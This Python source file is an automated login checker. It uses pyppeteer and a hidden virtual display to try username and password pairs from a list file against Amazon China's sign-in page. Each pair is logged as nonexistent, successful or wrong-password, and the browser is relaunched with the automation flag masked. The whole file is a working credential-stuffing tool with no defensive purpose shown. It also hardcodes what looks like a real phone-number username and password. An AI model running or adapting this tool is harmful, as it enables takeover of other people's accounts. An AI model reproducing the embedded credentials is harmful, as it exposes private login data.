import asyncio
import time
from pyppeteer import launch
from pyvirtualdisplay import Display
import nest_asyncio
import sys
import logging

nest_asyncio.apply()


async def amLogin(url, fileName, endFix):
    display = Display(visible=0, size=(800, 800))
    display.start()
    browser = await launch(
        options={
            'headless': False,
            'ignoreDefaultArgs': ['--enable-automation'],
            'args': ['--no-sandbox', '--disable-gpu'],
        })
    context = await browser.createIncognitoBrowserContext()
    page = await context.newPage()
    file = open(fileName)
    line = file.readline()  # 调用文件的 readline()方法
    if line == None:
        return
    while line:
        strlist = line.split('----')
        username = strlist[0] + endFix
        password = strlist[1].split('\n')[0]
        start = time.perf_counter()
        res = 1
        try:
            res = await test(page, username, password, url)
        except Exception as e:
            print("error", username, password)
        end = time.perf_counter()
        yongshi = end - start
        print("total==============", yongshi)
        if (res != 2 and (yongshi > 8)):
            try:
                await page.close()
                await context.close()
                await browser.close()
            except:
                print("reInit failed")
            browser = await launch(
                options={
                    'headless': False,
                    'ignoreDefaultArgs': ['--enable-automation'],
                    'args': ['--no-sandbox', '--disable-gpu'],
                    'dumpio': True
                })
            context = await browser.createIncognitoBrowserContext()
            page = await context.newPage()
        line = file.readline()


async def test(page, username, password, url):
    await page.goto(url, {'waitUntil': 'domcontentloaded'})
    await page.type('#ap_email', username)
    await page.click('#continue')
    await page.waitForNavigation()
    element = await page.querySelector(".a-alert-heading")
    if element != None:
        print("账号不存在", username, "----", password)
        return 1
    await page.type('#ap_password', password)
    await page.click('#signInSubmit')
    await page.waitForNavigation()
    element = await page.querySelector(".twotabsearchtextbox")
    if element != None:
        print("success", username, "----", password)
        return 2
    print("密码错误", username, "----", password)
    return 3


if __name__ == '__main__':
    file = sys.argv[1]
    endFix = sys.argv[2]
    url = "https://www.amazon.cn/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=cnflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.cn%2F%3Fref_%3Dnav_signin&switch_account="
    loop = asyncio.get_event_loop()
    userName = '15968124041'
    password = "ying4216321"
    loop.run_until_complete(amLogin(url, file, endFix))
